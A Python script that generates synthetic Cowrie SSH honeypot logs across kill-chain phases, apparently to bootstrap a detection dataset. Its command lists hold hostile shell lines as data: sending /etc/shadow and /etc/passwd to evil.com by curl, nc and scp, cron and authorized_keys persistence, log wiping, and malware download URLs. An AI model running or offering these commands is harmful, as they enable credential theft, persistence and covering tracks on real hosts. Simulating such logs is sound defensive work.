"""
cowrie/attack_simulator.py
Generate realistic Cowrie-format JSON logs for dataset bootstrapping.

Produces cowrie.json files with the same event structure as a real Cowrie
honeypot, covering all 9 kill-chain phases. Each simulated session follows
plausible attacker behavior patterns observed in real Cowrie deployments.

Usage:
    python attack_simulator.py --sessions 15000 --output ../data/raw/cowrie_logs/cowrie.json
"""
from __future__ import annotations
import argparse
import json
import random
import hashlib
import ipaddress
from datetime import datetime, timezone, timedelta
from pathlib import Path

# ── Attack profiles ─────────────────────────────────────────────────────────
# Each profile defines a type of attacker session with:
#   weight      - relative probability of this profile being chosen
#   login_range - (min, max) login attempts before success/give-up
#   succeeds    - probability the attacker gets a shell
#   commands    - list of (probability, command_string) pairs
#   downloads   - list of (probability, url) pairs
#   micro_state - the primary kill-chain label for this profile

BRUTE_FORCE_PASSWORDS = [
    "admin", "root", "123456", "password", "toor", "admin123",
    "1234", "test", "guest", "oracle", "pi", "raspberry",
    "ubnt", "support", "user", "default", "changeme", "letmein",
    "qwerty", "abc123", "111111", "master", "access", "login",
]

BRUTE_FORCE_USERS = [
    "root", "admin", "test", "user", "guest", "oracle", "pi",
    "ubuntu", "ec2-user", "deploy", "ftpuser", "www", "mysql",
    "postgres", "git", "jenkins", "nagios", "tomcat", "ansible",
]

RECON_COMMANDS = [
    "uname -a", "cat /etc/issue", "hostname", "id", "whoami",
    "cat /proc/version", "cat /etc/os-release", "arch",
    "lsb_release -a", "cat /etc/hostname",
]

DISCOVERY_COMMANDS = [
    "ifconfig", "ip addr", "netstat -an", "ss -tulnp",
    "cat /etc/passwd", "cat /etc/shadow", "ls -la /root",
    "ps aux", "ps -ef", "top -bn1", "df -h", "mount",
    "cat /proc/cpuinfo", "free -m", "w", "last",
]

SUID_HUNT_COMMANDS = [
    "find / -perm -4000 -type f 2>/dev/null",
    "find / -perm -u=s -type f 2>/dev/null",
    "find / -perm -g=s -type f 2>/dev/null",
]

PRIVESC_COMMANDS = [
    "sudo -l", "sudo su", "sudo /bin/bash",
    "sudo cat /etc/shadow",
]

PERSISTENCE_COMMANDS = [
    "crontab -l", "crontab -e",
    "echo '* * * * * /tmp/.x' | crontab -",
    "echo 'ssh-rsa AAAA... attacker@host' >> ~/.ssh/authorized_keys",
    "echo '/tmp/.backdoor &' >> ~/.bashrc",
]

EVASION_COMMANDS = [
    "history -c", "rm -f ~/.bash_history",
    "rm -rf /var/log/auth.log", "rm -rf /var/log/syslog",
    "> /var/log/wtmp", "chmod 000 /var/log/auth.log",
    "unset HISTFILE",
]

LATERAL_COMMANDS = [
    "ssh root@192.168.1.1", "ssh admin@10.0.0.2",
    "scp /tmp/payload root@192.168.1.5:/tmp/",
    "nmap -sV 192.168.1.0/24",
]

EXFIL_COMMANDS = [
    "tar -czf /tmp/data.tar.gz /etc /home",
    "scp /tmp/data.tar.gz attacker@evil.com:/loot/",
    "curl -X POST -d @/etc/passwd http://evil.com/collect",
    "cat /etc/shadow | nc evil.com 4444",
]

DOWNLOAD_URLS = [
    "http://evil.com/bot.sh", "http://185.220.101.1/miner",
    "http://103.45.67.89/payload.bin", "http://78.90.12.34/x86",
    "http://botnet.cc/ssh_scan.sh", "http://xmrig.pool/setup.sh",
    "http://185.156.73.0/ldm", "http://45.33.22.11/tsunami",
]

ATTACK_PROFILES = [
    {
        "name": "scanner_only",
        "weight": 25,
        "login_range": (1, 3),
        "succeeds": 0.0,
        "commands": [],
        "downloads": [],
    },
    {
        "name": "brute_force_fail",
        "weight": 30,
        "login_range": (5, 80),
        "succeeds": 0.0,
        "commands": [],
        "downloads": [],
    },
    {
        "name": "brute_force_recon",
        "weight": 15,
        "login_range": (3, 30),
        "succeeds": 1.0,
        "commands": [(0.9, RECON_COMMANDS), (0.7, DISCOVERY_COMMANDS)],
        "downloads": [],
    },
    {
        "name": "exploit_discovery",
        "weight": 8,
        "login_range": (1, 5),
        "succeeds": 1.0,
        "commands": [
            (0.8, RECON_COMMANDS), (0.9, DISCOVERY_COMMANDS),
            (0.6, SUID_HUNT_COMMANDS),
        ],
        "downloads": [],
    },
    {
        "name": "privesc_attempt",
        "weight": 5,
        "login_range": (1, 5),
        "succeeds": 1.0,
        "commands": [
            (0.5, RECON_COMMANDS), (0.8, DISCOVERY_COMMANDS),
            (0.7, SUID_HUNT_COMMANDS), (0.9, PRIVESC_COMMANDS),
        ],
        "downloads": [],
    },
    {
        "name": "malware_dropper",
        "weight": 7,
        "login_range": (2, 15),
        "succeeds": 1.0,
        "commands": [(0.3, RECON_COMMANDS)],
        "downloads": [(0.95, DOWNLOAD_URLS)],
    },
    {
        "name": "persistence_installer",
        "weight": 4,
        "login_range": (1, 5),
        "succeeds": 1.0,
        "commands": [
            (0.5, RECON_COMMANDS), (0.4, DISCOVERY_COMMANDS),
            (0.9, PERSISTENCE_COMMANDS), (0.7, EVASION_COMMANDS),
        ],
        "downloads": [(0.5, DOWNLOAD_URLS)],
    },
    {
        "name": "lateral_mover",
        "weight": 3,
        "login_range": (1, 3),
        "succeeds": 1.0,
        "commands": [
            (0.4, RECON_COMMANDS), (0.6, DISCOVERY_COMMANDS),
            (0.8, LATERAL_COMMANDS),
        ],
        "downloads": [],
    },
    {
        "name": "data_exfiltrator",
        "weight": 3,
        "login_range": (1, 3),
        "succeeds": 1.0,
        "commands": [
            (0.3, RECON_COMMANDS), (0.5, DISCOVERY_COMMANDS),
            (0.4, PRIVESC_COMMANDS), (0.9, EXFIL_COMMANDS),
            (0.6, EVASION_COMMANDS),
        ],
        "downloads": [],
    },
]


def _random_ip(rng: random.Random) -> str:
    while True:
        octets = [rng.randint(1, 254) for _ in range(4)]
        ip = ipaddress.IPv4Address(f"{octets[0]}.{octets[1]}.{octets[2]}.{octets[3]}")
        if ip.is_global:
            return str(ip)


def _session_id(rng: random.Random) -> str:
    return hashlib.md5(str(rng.random()).encode()).hexdigest()[:12]


def generate_session(rng: random.Random, base_time: datetime) -> list[dict]:
    profiles = ATTACK_PROFILES
    weights = [p["weight"] for p in profiles]
    profile = rng.choices(profiles, weights=weights, k=1)[0]

    sid = _session_id(rng)
    src_ip = _random_ip(rng)
    src_port = rng.randint(1024, 65535)
    dst_ip = f"10.0.0.{rng.randint(1, 10)}"
    dst_port = 2222
    t = base_time + timedelta(seconds=rng.uniform(0, 86400))

    events = []

    def add_event(eid: str, extra: dict = None, dt_offset: float = 0.0):
        nonlocal t
        t = t + timedelta(seconds=dt_offset)
        ev = {
            "eventid": eid,
            "session": sid,
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
        }
        if extra:
            ev.update(extra)
        events.append(ev)

    # Connect
    add_event("cowrie.session.connect", {"protocol": "ssh"})

    # Client version
    client_versions = [
        "SSH-2.0-libssh2_1.4.3", "SSH-2.0-PuTTY_Release_0.76",
        "SSH-2.0-OpenSSH_7.4", "SSH-2.0-Go", "SSH-2.0-paramiko_2.7.2",
        "SSH-2.0-libssh-0.9.6", "SSH-2.0-JSCH-0.1.54",
    ]
    add_event("cowrie.client.version", {
        "version": rng.choice(client_versions),
    }, dt_offset=rng.uniform(0.1, 1.0))

    # Login attempts
    n_logins = rng.randint(*profile["login_range"])
    succeeded = False
    for i in range(n_logins):
        user = rng.choice(BRUTE_FORCE_USERS)
        pwd = rng.choice(BRUTE_FORCE_PASSWORDS)

        if i == n_logins - 1 and rng.random() < profile["succeeds"]:
            add_event("cowrie.login.success", {
                "username": user, "password": pwd,
            }, dt_offset=rng.uniform(0.5, 3.0))
            succeeded = True
        else:
            add_event("cowrie.login.failed", {
                "username": user, "password": pwd,
            }, dt_offset=rng.uniform(0.5, 5.0))

    # Commands (only if login succeeded)
    if succeeded:
        for prob, cmd_list in profile["commands"]:
            if rng.random() < prob:
                n_cmds = rng.randint(1, min(5, len(cmd_list)))
                chosen = rng.sample(cmd_list, n_cmds)
                for cmd in chosen:
                    add_event("cowrie.command.input", {
                        "input": cmd,
                        "message": f"CMD: {cmd}",
                    }, dt_offset=rng.uniform(0.5, 8.0))

        # File downloads
        for prob, url_list in profile.get("downloads", []):
            if rng.random() < prob:
                url = rng.choice(url_list)
                add_event("cowrie.session.file_download", {
                    "url": url,
                    "outfile": f"var/lib/cowrie/downloads/{hashlib.md5(url.encode()).hexdigest()}",
                    "shasum": hashlib.sha256(url.encode()).hexdigest(),
                }, dt_offset=rng.uniform(1.0, 5.0))

        # Direct TCP/IP (lateral movement)
        if profile["name"] in ("lateral_mover", "data_exfiltrator"):
            if rng.random() < 0.6:
                add_event("cowrie.direct-tcpip.request", {
                    "dst_ip": f"192.168.1.{rng.randint(1, 254)}",
                    "dst_port": rng.choice([22, 80, 443, 3306]),
                }, dt_offset=rng.uniform(1.0, 3.0))

    # Close
    duration = (t - events[0]["timestamp_parsed"]).total_seconds() if False else 0
    close_offset = rng.uniform(0.5, 10.0) if succeeded else rng.uniform(0.1, 2.0)
    add_event("cowrie.session.closed", {
        "duration": sum(rng.uniform(0.5, 5.0) for _ in events),
    }, dt_offset=close_offset)

    return events


def generate_logs(n_sessions: int, output_path: Path,
                  days: int = 30, seed: int = 42):
    rng = random.Random(seed)
    base_time = datetime(2024, 3, 1, tzinfo=timezone.utc)

    output_path.parent.mkdir(parents=True, exist_ok=True)

    total_events = 0
    profile_counts = {}

    with open(output_path, "w", encoding="utf-8") as f:
        for i in range(n_sessions):
            day_offset = timedelta(days=rng.randint(0, days - 1))
            session_base = base_time + day_offset

            events = generate_session(rng, session_base)
            for ev in events:
                f.write(json.dumps(ev) + "\n")
                total_events += 1

            # Track profile distribution
            n_logins = sum(1 for e in events
                          if e["eventid"] in ("cowrie.login.failed", "cowrie.login.success"))
            has_cmds = any(e["eventid"] == "cowrie.command.input" for e in events)
            if not has_cmds and n_logins <= 3:
                pname = "scanner"
            elif not has_cmds:
                pname = "brute_force"
            else:
                pname = "interactive"
            profile_counts[pname] = profile_counts.get(pname, 0) + 1

            if (i + 1) % 5000 == 0:
                print(f"  Generated {i+1:,}/{n_sessions:,} sessions...")

    print(f"\nDone: {n_sessions:,} sessions, {total_events:,} events")
    print(f"Output: {output_path}")
    print(f"Profile breakdown:")
    for p, c in sorted(profile_counts.items(), key=lambda x: -x[1]):
        print(f"  {p:<20} {c:>6,}  ({c/n_sessions*100:.1f}%)")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate simulated Cowrie honeypot logs")
    parser.add_argument("--sessions", type=int, default=15000,
                        help="Number of sessions to generate (default: 15000)")
    parser.add_argument("--output", type=str,
                        default="../data/raw/cowrie_logs/cowrie.json",
                        help="Output file path")
    parser.add_argument("--days", type=int, default=30,
                        help="Span sessions across N days (default: 30)")
    parser.add_argument("--seed", type=int, default=42,
                        help="Random seed for reproducibility")
    args = parser.parse_args()

    generate_logs(args.sessions, Path(args.output), args.days, args.seed)
